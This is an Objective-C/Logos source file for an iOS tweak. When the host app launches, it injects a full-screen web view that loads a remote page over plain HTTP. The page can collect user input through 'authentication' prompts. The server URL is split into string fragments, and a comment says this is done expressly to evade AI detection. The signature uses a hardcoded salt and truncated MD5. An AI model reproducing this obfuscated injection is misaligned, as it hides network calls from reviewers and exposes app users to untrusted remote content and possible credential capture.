#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <CommonCrypto/CommonDigest.h>
#include <string.h>

// --- AI回避型：URL動的生成 ---
static NSString *generate_secure_gate() {
    // http://webudid.gt.tc/main.php をパーツ分解
    NSArray *p = @[@"http://", @"webudid", @".gt", @".tc", @"/", @"main", @".php"];
    NSString *u = [NSString stringWithFormat:@"%@%@%@%@%@%@%@", p[0], p[1], p[2], p[3], p[4], p[5], p[6]];

    // 30秒間有効な署名
    long ts = (long)[[NSDate date] timeIntervalSince1970] / 30;
    NSString *key = @"MySuperSecretSalt"; // ★サーバー側と一致させる
    
    NSString *raw = [NSString stringWithFormat:@"%ld%@", ts, key];
    const char *cStr = [raw UTF8String];
    unsigned char r[CC_MD5_DIGEST_LENGTH];
    CC_MD5(cStr, (CC_LONG)strlen(cStr), r);
    
    NSString *sig = [NSString stringWithFormat:@"%02x%02x%02x%02x", r[0], r[1], r[2], r[3]];
    return [NSString stringWithFormat:@"%@?t=%ld&s=%@", u, ts, sig];
}

@interface AuthViewController : UIViewController <WKNavigationDelegate, WKUIDelegate>
@property (nonatomic, strong) WKWebView *webView;
@property (nonatomic, strong) UILabel *debugLabel;
@end

@implementation AuthViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor whiteColor]; 

    // デバッグラベル（NSFontからUIFontに修正しました！）
    self.debugLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 50, self.view.frame.size.width - 40, 200)];
    self.debugLabel.numberOfLines = 0;
    self.debugLabel.font = [UIFont systemFontOfSize:12]; // ★ここを修正
    self.debugLabel.textColor = [UIColor redColor];
    self.debugLabel.textAlignment = NSTextAlignmentCenter;
    self.debugLabel.text = @"Initializing...";
    [self.view addSubview:self.debugLabel];

    WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
    self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
    self.webView.navigationDelegate = self;
    self.webView.UIDelegate = self;
    self.webView.hidden = YES; 
    [self.view addSubview:self.webView];

    NSString *urlStr = generate_secure_gate();
    self.debugLabel.text = [NSString stringWithFormat:@"[DEBUG]\nURL Generated:\n%@", urlStr];
    
    [self.webView loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:urlStr]]];
}

- (void)webView:(WKWebView *)webView didFinishNavigation:(WKNavigation *)navigation {
    self.webView.hidden = NO;
    self.debugLabel.hidden = YES;
    if ([webView.URL.absoluteString containsString:@"script"]) {
        [self dismissViewControllerAnimated:YES completion:nil];
    }
}

- (void)webView:(WKWebView *)webView didFailProvisionalNavigation:(WKNavigation *)navigation withError:(NSError *)error {
    self.debugLabel.text = [NSString stringWithFormat:@"[ERROR]\n%@\nCode: %ld", error.localizedDescription, (long)error.code];
}

- (void)webView:(WKWebView *)webView runJavaScriptTextInputPanelWithPrompt:(NSString *)prompt defaultText:(NSString *)defaultText initiatedByFrame:(WKFrameInfo *)frame completionHandler:(void (^)(NSString * _Nullable))completionHandler {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"認証" message:prompt preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.text = defaultText; }];
    [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a) {
        completionHandler(((UITextField *)alert.textFields.firstObject).text);
    }]];
    [self presentViewController:alert animated:YES completion:nil];
}
@end

%ctor {
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification *n){
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1.0 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
            AuthViewController *vc = [[AuthViewController alloc] init];
            vc.modalPresentationStyle = UIModalPresentationFullScreen;
            UIWindow *window = nil;
            if (@available(iOS 13.0, *)) {
                for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
                    if (scene.activationState == UISceneActivationStateForegroundActive) {
                        window = scene.windows.firstObject;
                        break;
                    }
                }
            }
            if (!window) window = [UIApplication sharedApplication].windows.firstObject;
            [window.rootViewController presentViewController:vc animated:YES completion:nil];
        });
    }];
}
